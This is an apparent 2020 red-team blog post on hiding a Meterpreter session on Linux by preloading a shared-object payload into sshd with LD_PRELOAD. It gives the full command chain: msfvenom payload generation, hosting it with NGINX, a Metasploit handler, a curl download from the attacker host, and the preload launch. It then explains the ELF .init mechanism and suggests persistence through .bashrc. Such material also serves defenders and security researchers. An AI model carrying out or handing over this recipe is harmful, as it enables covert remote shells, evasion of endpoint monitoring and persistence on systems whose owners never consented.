---
layout: post
title: "Linux EDR Evasion With Meterpreter and LD_PRELOAD"
date: 2020-02-06
categories: ld_preload linux edr evasion meterpreter
---

Everyone has their favorite adversary technique to research and mine is LD_PRELOAD process injection because it's pretty versatile. It lets you hook functions to manipulate output, and it can also let you trip up defenders by injecting code into arbitrary processes for execution. In this post, I'll walk through how an adversary might combine Meterpreter with LD_PRELOAD to hide malicious activity under a legitimate Linux system process.

## The Setup

To get started, I'm working with a Kali Linux machine as my attacker system and a CentOS 8 system as my victim. You don't have to limit yourself to this setup, but it's what works for me at the moment.

On the victim system, the only access needed is code execution and the ability to transfer a payload.

On my attacker machine, I need to generate a Meterpeter payload within a shared object library format. To do this, we can use `msfvenom`.

```
# msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.10.57 LPORT=2022 -f elf-so > meterpreter.so
```

Next, we need a way to transfer `meterpreter.so` to the victim system. This may be done via a `curl` command or another method of downloading/uploading files.

In my case, I used NGINX to host the SO library from my Kali machine for download:

```
# cp meterpreter.so /var/www/html/
# systemctl start nginx
```

Finally, we need to set up a handler to receive the connection and use it in Metasploit. To do this, we can work with `msfconsole`.

```
# msfconsole

# msf5 > use exploit/multi/handler
# msf5 > set payload linux/x64/meterpreter/reverse_tcp
# msf5 > set LHOST 10.10.10.57
# msf5 > set LPORT 2022
# msf5 > run

[*] Started reverse TCP handler on 10.10.10.57:2022
```

And now we move to our victim system for execution!

## The Execution

On my victim system, I downloaded the SO library using a simple `curl` command:

```
$ curl -O http://10.10.10.57/meterpreter.so
```

From here I can pick any process I want to attribute execution to, as long as it isn't statically compiled. In this case, I'm choosing `sshd` since it often makes network connections and because some network admins use `tcp/2022` to obscure their SSH service availability.

```
$ LD_PRELOAD=./meterpreter.so sshd
```

Once executed, control is never actually passed to `sshd`, and the process execution is controlled by `meterpreter.so` as it reports back for commands. It appears that the process is frozen, but it really isn't.

On the Kali machine I see:

```
[*] Sending stage (3021284 bytes) to 10.10.10.51
[*] Meterpreter session 1 opened (10.10.10.57:2022 -> 10.10.10.51:39314) at 2020-02-06 20:05:00 -0600
```

From Kali I can join the Meterpreter session and get access at the permission level of the victim's user account:

```
meterpreter > sysinfo
Computer        : cent8-01.westeros.local
OS              : CentOS 8.0.1905 (Linux 4.18.0-80.el8.x86_64)
Architecture    : x64
BuildTuple      : x86_64-linux-musl
Meterpreter     : x64/linux
```

If we go to investigate with an EDR product, Auditd/Auditbeats logs, or osquery, the network connection and any actions will be attributed to `sshd`. This requires a defender to be much sharper on their game to spot malicious activity and understand the behavior of system processes. Depending on the actions we want to perform and the ports available for C2, we could potentially do the same with `httpd`, `smtpd`, `vsftpd`, etc.

## How Does It Work?

Most of the time we can safely assume that SO libraries work in a similar fashion to DLLs on Windows. That is, the library must have an exported symbol that should be called for code to execute. We can inspect SO libraries for exported symbols using the `nm` command. Howver, when we inspect our generated `meterpreter.so` library we can notice something odd:

```
# nm -D meterpreter.so
nm: meterpreter.so: no symbols
```

Oddly enough, it doesn't look like our `meterpreter.so` has any symbols to call, so how did `sshd` know to execute the code within the SO library? This is because of a feature of the ELF binary format.

SO libraries follow the ELF binary format and include a section called `.init`. Any code placed within this section will execute when the library is loaded by a process and before control is passed to the process itself. The section is usually used by compilers for global constructors, but we can put nearly anything there for exploitation. When `msfvenom` creates its `elf-so` payloads, it embeds payloads within a template designed to house the payload within the `.init` section for execution. That way, no process should need knowledge of symbols within the library for execution.

This is also the way payloads generated/used by the [Zombie Ant Farm](https://github.com/dsnezhkov/zombieant) project work.

The use of a `.init` section also has an interesting limitation when combined with preloading- it can only be used effectively when you define `LD_PRELOAD` for a single process. When executing Meterpreter in this fashion, the victim process will appear hung. This is because the Meterpreter code continuously executes before control is passed to the victim process's main function. The rest of the process instructions will not execute until Meterpreter exits. This means that if you export `LD_PRELOAD` to leverage this SO library or write the library path into `ld.so.preload`, it will cause serious instability. If you use a preload method that causes `meterpreter.so` to load into numerous or all processes, it will cause loads of processes, even ones needed for system operation, to hang immediately after loading the SO library. So, no bueno.

## Is It Useful?

Eh, it depends. We obviously already need code execution and a method of downloading code to a victim for this to be possible. I could see this being useful when combined with an RCE against publicly-available services to get a stable shell. That said, a simpler and safer route in terms of stability could also be the execution of a Python C2 agent. In the case of a Python agent, it would be slightly harder to cause the attribution of activity to a system process. This is not going to be an initial access method, it would be more useful for long-term evasion and persistence when combined with a `.bash_profile` or `.bashrc` command execution.